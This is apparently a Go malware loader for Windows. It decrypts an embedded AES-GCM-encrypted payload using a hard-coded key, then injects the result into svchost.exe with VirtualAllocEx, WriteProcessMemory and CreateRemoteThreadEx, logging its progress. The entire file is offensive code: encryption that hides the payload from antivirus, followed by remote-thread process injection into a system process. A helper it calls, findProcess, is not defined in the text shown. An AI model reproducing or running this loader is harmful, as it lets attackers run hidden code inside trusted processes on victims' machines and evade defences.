//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Auto-replace markers for key and payload

var buf = []byte { 
	0x70, 0xe2, 0x19, 0x7b, 0x12, 0x9d, 0xdf, 0x50, 0x63, 0xdc, 0x50, 0x36, 0xf1, 0x36, 0x58, 0x35, 
	0x9b, 0x61, 0xdf, 0xe1, 0xf8, 0x2b, 0x62, 0x85, 0x1d, 0xa4, 0xe2, 0x86, 0x5f, 0x56, 0x6f, 0x52, 
	0xaf, 0x2d, 0xa2, 0x2f, 0xb0, 0xc6, 0x6, 0x7a, 0x5b, 0x46, 0x7a, 0xaf, 0x5f, 0xfe, 0x63, 0x57, 
	0x7c, 0xf5, 0x27, 0xd, 0x6, 0xf6, 0xf4, 0x1f, 0x3b, 0xe8, 0x9e, 0x91, 0xdc, 0x2f, 0x96, 0x2d, 
	0x16, 0x68, 0x89, 0x3c, 0x5d, 0x33, 0xc5, 0xbd, 0xf7, 0xac, 0x62, 0xcf, 0xf7, 0x1a, 0xbf, 0xba, 
	0xd2, 0x99, 0x71, 0x5f, 0x33, 0x36, 0xf0, 0x3e, 0xb1, 0x71, 0xed, 0x15, 0xe9, 0x82, 0x8e, 0x81, 
	0x27, 0xa1, 0x44, 0xdb, 0xd3, 0x73, 0x7c, 0x35, 0x89, 0xfb, 0xc8, 0x48, 0xa2, 0xda, 0x51, 0xac, 
	0xf9, 0x40, 0xa7, 0x25, 0x51, 0xa0, 0x98, 0x2f, 0x97, 0xe7, 0xb5, 0x43, 0xb6, 0x17, 0x90, 0xd4, 
	0x1b, 0x79, 0xea, 0x58, 0x10, 0x66, 0x6e, 0x93, 0x70, 0xb9, 0x4c, 0x2, 0x79, 0x50, 0x25, 0x5a, 
	0x3e, 0xad, 0xda, 0xb5, 0xec, 0xa0, 0xda, 0x2d, 0xcd, 0xd5, 0xb, 0x8f, 0x31, 0x82, 0x9, 0x90, 
	0x48, 0x65, 0xd, 0xdd, 0xb4, 0xef, 0x1, 0x33, 0x55, 0xfd, 0x28, 0x7, 0xeb, 0x1e, 0xa0, 0xe6, 
	0x79, 0x12, 0x25, 0xfc, 0x3, 0xf4, 0x4d, 0xe1, 0x16, 0xdf, 0xb, 0x39, 0x2d, 0xc6, 0x7d, 0x80, 
	0x71, 0xfe, 0xa4, 0x6e, 0xe8, 0x79, 0xfc, 0xd, 0x8b, 0x35, 0xf6, 0xcf, 0xcf, 0x81, 0xb9, 0xbc, 
	0xd8, 0xf1, 0x1a, 0x24, 0x24, 0x5, 0xb9, 0x7, 0x49, 0x1, 0x38, 0xca, 0x86, 0xb1, 0xbb, 0xd1, 
	0x3, 0xa8, 0xa2, 0x81, 0x4f, 0xb3, 0x3e, 0x76, 0x2e, 0x43, 0x4a, 0x8a, 0x98, 0x95, 0x9b, 0xbc, 
	0x19, 0x18, 0x83, 0x57, 0x74, 0x47, 0xd2, 0x90, 0xc5, 0xf8, 0x20, 0xe5, 0x19, 0xd3, 0x18, 0x44, 
	0xd9, 0xc7, 0xe5, 0x2c, 0xbc, 0x92, 0x52, 0x7b, 0x4d, 0x8e, 0x12, 0x16, 0x49, 0x95, 0x89, 0x9f, 
	0xbc, 0x99, 0xa7, 0x45, 0xfc, 0xac, 0x22, 0x8e, 0x88, 0x8d, 0x6b, 0x4b, 0xa5, 0x1, 0x1f, 0xa3, 
	0x72, 0xd8, 0x50, 0x1, 0x26, 0xf7, 0xd8, 0x43, 0x6e, 0x43, 0x31, 0x53, 0xb6, 0xe0, 0xc1, 0xa8} 



var key = []byte { 
	0xfd, 0x51, 0x63, 0x7, 0x42, 0xaf, 0xb, 0x27, 0x18, 0xf1, 0x55, 0x7b, 0x87, 0xb3, 0xe1, 0x5b, 
	0xd1, 0xb5, 0x2e, 0xd7, 0xd4, 0x2, 0x60, 0x21, 0x3b, 0xcf, 0x2c, 0x9d, 0x49, 0x5, 0xaf, 0x74} 




func check(err error) {
	if err != nil {
		panic(err)
	}
}

func decryptAES(ciphertext []byte, eKey []byte) (plaintext []byte) {
	c, err := aes.NewCipher(eKey)
	check(err)

	gcm, err := cipher.NewGCM(c)
	check(err)

	nonceSize := gcm.NonceSize()

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err = gcm.Open(nil, nonce, ciphertext, nil)
	check(err)
	return
}

func injectProcess(sc []byte) {
	pid := findProcess("svchost.exe")
	fmt.Printf("    [*] Injecting into svchost.exe, PID=[%d]\n", pid)
	if pid == 0 {
		panic("Cannot find svchost.exe process")
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	proc, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if errOpenProcess != nil {
		panic(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(proc), 0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc), addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	op := 0
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&op)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}

	errCloseHandle := windows.CloseHandle(proc)
	if errCloseHandle != nil {
		panic(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
}

func main() {
	injectProcess(decryptAES(buf, key))
}
